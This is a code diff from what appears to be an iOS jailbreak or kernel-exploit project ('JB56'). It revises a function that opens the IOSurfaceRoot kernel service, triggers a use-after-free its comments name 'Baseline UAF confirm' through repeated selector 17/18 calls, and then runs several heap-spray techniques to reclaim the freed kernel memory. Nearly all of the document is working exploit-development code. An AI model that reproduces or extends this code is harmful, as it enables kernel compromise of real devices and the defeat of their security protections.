@@ -41914,34 +41914,35 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
         log(@"=== Zone Oracle ===");
         log(@"JB56: === Zone Oracle — Kernel Operation Detector ===");
 
-        typedef void *(*matching_fn)(const char *);
-        typedef unsigned int(*getmatch_fn)(unsigned int, void *);
-        typedef int (*ioserviceopen_fn)(unsigned int, unsigned int, uint32_t, unsigned int *);
-        typedef int (*ioserviceclose_fn)(unsigned int);
-        typedef void (*ioobjectrelease_fn)(unsigned int);
+        // Use EXACT same typedefs as JB55 (proven working)
+        typedef void*(*matching_fn)(const char*);
+        typedef unsigned int(*getmatch_fn)(unsigned int, void*);
+        typedef int(*svcopen_fn)(unsigned int, unsigned int, unsigned int, unsigned int*);
+        typedef int(*svcclose_fn)(unsigned int);
         typedef int(*callmethod_fn)(unsigned int, uint32_t, const uint64_t*, uint32_t, const void*, size_t, uint64_t*, uint32_t*, void*, size_t*);
         typedef int(*callasync_fn)(unsigned int, uint32_t, unsigned int, uint64_t*, uint32_t, const uint64_t*, uint32_t, const void*, size_t, void*, uint32_t*, uint64_t*, uint32_t*);
-        typedef int (*ioconnectsetcfprops_fn)(unsigned int, void *);
-        typedef kern_return_t (*host_create_voucher_fn)(host_t, mach_voucher_attr_raw_recipe_array_t, mach_msg_type_number_t, mach_port_t *);
+        typedef int(*objrelease_fn)(unsigned int);
+        typedef int(*ioconnectsetcfprops_fn)(unsigned int, void*);
 
-        matching_fn sym_match = (matching_fn)dlsym(RTLD_DEFAULT, "IOServiceMatching");
-        getmatch_fn sym_getMatch = (getmatch_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
-        ioserviceopen_fn sym_open = (ioserviceopen_fn)dlsym(RTLD_DEFAULT, "IOServiceOpen");
-        ioserviceclose_fn sym_close = (ioserviceclose_fn)dlsym(RTLD_DEFAULT, "IOServiceClose");
-        ioobjectrelease_fn sym_release = (ioobjectrelease_fn)dlsym(RTLD_DEFAULT, "IOObjectRelease");
+        matching_fn sym_matching = (matching_fn)dlsym(RTLD_DEFAULT, "IOServiceMatching");
+        getmatch_fn sym_getmatch = (getmatch_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+        svcopen_fn sym_open = (svcopen_fn)dlsym(RTLD_DEFAULT, "IOServiceOpen");
+        svcclose_fn sym_close = (svcclose_fn)dlsym(RTLD_DEFAULT, "IOServiceClose");
         callmethod_fn sym_call = (callmethod_fn)dlsym(RTLD_DEFAULT, "IOConnectCallMethod");
         callasync_fn sym_async = (callasync_fn)dlsym(RTLD_DEFAULT, "IOConnectCallAsyncMethod");
+        objrelease_fn sym_release = (objrelease_fn)dlsym(RTLD_DEFAULT, "IOObjectRelease");
         ioconnectsetcfprops_fn sym_setprops = (ioconnectsetcfprops_fn)dlsym(RTLD_DEFAULT, "IOConnectSetCFProperties");
-        host_create_voucher_fn sym_voucher = (host_create_voucher_fn)dlsym(RTLD_DEFAULT, "host_create_mach_voucher");
 
-        if (!sym_match || !sym_getMatch || !sym_open || !sym_close || !sym_release || !sym_call || !sym_async) {
+        if (!sym_matching || !sym_getmatch || !sym_open || !sym_close || !sym_call || !sym_async) {
             results[@"verdict"] = @"NO_SYMBOLS";
             log(@"JB56: Failed to resolve symbols");
             done(results);
             return;
         }
 
-        unsigned int svc = sym_getMatch(0, sym_match("IOSurfaceRoot"));
+        log(@"JB56: dlsym OK");
+
+        unsigned int svc = sym_getmatch(0, sym_matching("IOSurfaceRoot"));
         if (!svc) {
             results[@"verdict"] = @"NO_SERVICE";
             log(@"JB56: IOSurfaceRoot not found");
@@ -41952,31 +41953,36 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
         unsigned int conn = 0;
         int kr = sym_open(svc, mach_task_self(), 0, &conn);
         sym_release(svc);
-        if (kr != 0 || !conn) {
+        if (kr || !conn) {
             results[@"verdict"] = @"OPEN_FAIL";
-            log([NSString stringWithFormat:@"JB56: IOServiceOpen failed: 0x%x", kr]);
+            log([NSString stringWithFormat:@"JB56: IOServiceOpen failed: 0x%x conn=%u", kr, conn]);
             done(results);
             return;
         }
 
-        unsigned int wp = 0;
-        {
-            mach_port_t p = MACH_PORT_NULL;
-            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
-            wp = (unsigned int)p;
-        }
+        log([NSString stringWithFormat:@"JB56: conn=%u svc_ok=YES open_kr=0x%x", conn, kr]);
+
+        // Use jb41 helpers (proven working pattern)
+        unsigned int wp = jb41_newWakePort();
         uint64_t ref = 0x1122334455667788ULL;
         uint64_t regIn[3] = {1, 2, 3};
+
+        // Quick sanity: direct sel17 register to verify connection works
+        int sanity = jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
+        log([NSString stringWithFormat:@"JB56: sanity reg=0x%x", (unsigned)sanity]);
+        if (sanity == 0) {
+            jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
+        }
 
         // ---- T1: Baseline UAF confirm ----
         log(@"JB56: T1 — Baseline UAF confirm");
         int t1_hits = 0;
         @try {
             for (int trial = 0; trial < 3 && !isr_stopped(); trial++) {
-                int r1 = sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
-                int r2 = sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
-                int r3 = sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
-                sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                int r1 = jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
+                int r2 = jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
+                int r3 = jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
+                jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
 
                 log([NSString stringWithFormat:@"JB56: T1 trial=%d reg=0x%x dereg=0x%x dup=0x%x",
                      trial, (unsigned)r1, (unsigned)r2, (unsigned)r3]);
@@ -42006,8 +42012,8 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
             log(@"JB56: T2 — IOConnectSetCFProperties spray");
             @try {
                 for (int trial = 0; trial < 5 && !isr_stopped(); trial++) {
-                    sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
-                    sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                    jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
+                    jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
 
                     if (sym_setprops) {
                         for (int i = 0; i < 64; i++) {
@@ -42016,8 +42022,8 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
                         }
                     }
 
-                    int dup = sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
-                    sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                    int dup = jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
+                    jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
 
                     log([NSString stringWithFormat:@"JB56: T2 trial=%d dup=0x%x", trial, (unsigned)dup]);
                     if (dup == 0) {
@@ -42037,12 +42043,14 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
             log(@"JB56: T3 — mach_voucher_create spray");
             @try {
                 for (int trial = 0; trial < 5 && !isr_stopped(); trial++) {
-                    sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
-                    sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                    jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
+                    jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
 
                     unsigned int vouchers[64];
                     int vcount = 0;
-                    if (sym_voucher) {
+                    typedef kern_return_t (*host_voucher_fn)(host_t, mach_voucher_attr_raw_recipe_array_t, mach_msg_type_number_t, mach_port_t *);
+                    host_voucher_fn local_voucher = (host_voucher_fn)dlsym(RTLD_DEFAULT, "host_create_mach_voucher");
+                    if (local_voucher) {
                         for (int i = 0; i < 64; i++) {
                             struct {
                                 uint32_t key;
@@ -42055,7 +42063,7 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
                             recipe.command = 1;
                             recipe.content_size = 0;
                             mach_port_t vp = MACH_PORT_NULL;
-                            kern_return_t vkr = sym_voucher(
+                            kern_return_t vkr = local_voucher(
                                 mach_host_self(),
                                 (mach_voucher_attr_raw_recipe_array_t)&recipe,
                                 sizeof(recipe),
@@ -42067,8 +42075,8 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
                         }
                     }
 
-                    int dup = sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
-                    sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                    int dup = jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
+                    jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
 
                     for (int i = 0; i < vcount; i++) {
                         mach_port_deallocate(mach_task_self(), (mach_port_t)vouchers[i]);
@@ -42093,8 +42101,8 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
             log(@"JB56: T4 — semaphore_create spray");
             @try {
                 for (int trial = 0; trial < 5 && !isr_stopped(); trial++) {
-                    sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
-                    sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                    jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
+                    jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
 
                     unsigned int sems[64];
                     int scount = 0;
@@ -42106,8 +42114,8 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
                         }
                     }
 
-                    int dup = sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
-                    sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                    int dup = jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
+                    jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
 
                     for (int i = 0; i < scount; i++) {
                         semaphore_destroy(mach_task_self(), (semaphore_t)sems[i]);
@@ -42132,8 +42140,8 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
             log(@"JB56: T5 — kqueue+kevent spray");
             @try {
                 for (int trial = 0; trial < 5 && !isr_stopped(); trial++) {
-                    sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
-                    sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                    jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
+                    jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
 
                     int kqfds[32];
                     int kqcount = 0;
@@ -42147,8 +42155,8 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
                         }
                     }
 
-                    int dup = sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
-                    sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                    int dup = jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
+                    jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
 
                     for (int i = 0; i < kqcount; i++) {
                         close(kqfds[i]);
@@ -42173,8 +42181,8 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
             log(@"JB56: T6 — socket+setsockopt spray");
             @try {
                 for (int trial = 0; trial < 5 && !isr_stopped(); trial++) {
-                    sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
-                    sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                    jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
+                    jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
 
                     int sockfds[32];
                     int sockcount = 0;
@@ -42188,8 +42196,8 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
                         }
                     }
 
-                    int dup = sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
-                    sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                    int dup = jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
+                    jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
 
                     for (int i = 0; i < sockcount; i++) {
                         close(sockfds[i]);
@@ -42215,16 +42223,16 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
             @try {
                 for (int trial = 0; trial < 5 && !isr_stopped(); trial++) {
                     uint64_t regA[3] = {1, 2, 3};
-                    sym_async(conn, 17, wp, &ref, 1, regA, 3, NULL, 0, NULL, NULL, NULL, NULL);
-                    sym_call(conn, 18, regA, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                    jb41_callSel(conn, 17, regA, 3, 1, wp, (void*)sym_call, (void*)sym_async);
+                    jb41_callSel(conn, 18, regA, 3, 0, wp, (void*)sym_call, (void*)sym_async);
 
                     uint64_t regB[3] = {4, 5, 6};
-                    int r_b = sym_async(conn, 17, wp, &ref, 1, regB, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                    int r_b = jb41_callSel(conn, 17, regB, 3, 1, wp, (void*)sym_call, (void*)sym_async);
 
-                    int dup = sym_async(conn, 17, wp, &ref, 1, regA, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                    int dup = jb41_callSel(conn, 17, regA, 3, 1, wp, (void*)sym_call, (void*)sym_async);
 
-                    sym_call(conn, 18, regA, 3, NULL, 0, NULL, NULL, NULL, NULL);
-                    sym_call(conn, 18, regB, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                    jb41_callSel(conn, 18, regA, 3, 0, wp, (void*)sym_call, (void*)sym_async);
+                    jb41_callSel(conn, 18, regB, 3, 0, wp, (void*)sym_call, (void*)sym_async);
 
                     log([NSString stringWithFormat:@"JB56: T7 trial=%d regB=0x%x dupA=0x%x",
                          trial, (unsigned)r_b, (unsigned)dup]);
@@ -42244,7 +42252,7 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
         if (!isr_stopped()) {
             log(@"JB56: T8 — Cross-connection same-type reclaim");
             @try {
-                unsigned int svc2 = sym_getMatch(0, sym_match("IOSurfaceRoot"));
+                unsigned int svc2 = sym_getmatch(0, sym_matching("IOSurfaceRoot"));
                 unsigned int conn2 = 0;
                 int okr2 = 0;
                 if (svc2) {
@@ -42254,15 +42262,15 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
 
                 if (okr2 == 0 && conn2 != 0) {
                     for (int trial = 0; trial < 5 && !isr_stopped(); trial++) {
-                        sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
-                        sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                        jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
+                        jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
 
-                        int r2 = sym_async(conn2, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                        int r2 = jb41_callSel(conn2, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
 
-                        int dup = sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                        int dup = jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
 
-                        sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
-                        sym_call(conn2, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                        jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
+                        jb41_callSel(conn2, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
 
                         log([NSString stringWithFormat:@"JB56: T8 trial=%d regConn2=0x%x dupConn1=0x%x",
                              trial, (unsigned)r2, (unsigned)dup]);
